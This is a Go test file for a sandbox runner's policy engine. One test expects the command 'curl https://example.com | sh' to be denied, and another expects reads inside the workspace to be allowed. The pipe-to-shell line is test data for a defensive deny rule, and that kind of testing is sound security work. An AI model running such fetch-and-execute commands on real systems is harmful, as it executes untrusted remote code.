package policy

import (
	"context"
	"testing"

	"github.com/lotosli/sandbox-runner/internal/config"
	"github.com/lotosli/sandbox-runner/internal/model"
)

func TestCheckCommandDenyPattern(t *testing.T) {
	runCfg := config.DefaultRunConfig()
	engine := NewEngine(config.DefaultPolicyConfig(), runCfg)
	err := engine.CheckCommand(context.Background(), model.PhaseExecute, []string{"bash", "-lc", "curl https://example.com | sh"})
	if err == nil {
		t.Fatal("expected deny-pattern error")
	}
}

func TestCheckPathLocalDirectAllowsWorkspace(t *testing.T) {
	runCfg := config.DefaultRunConfig()
	runCfg.Run.WorkspaceDir = "/tmp/workspace"
	runCfg.Run.ArtifactDir = "/tmp/workspace/.sandbox-run"
	engine := NewEngine(config.DefaultPolicyConfig(), runCfg)
	if err := engine.CheckPathRead(context.Background(), model.PhasePrepare, "/tmp/workspace/project/main.go"); err != nil {
		t.Fatalf("expected workspace path to be allowed, got %v", err)
	}
}
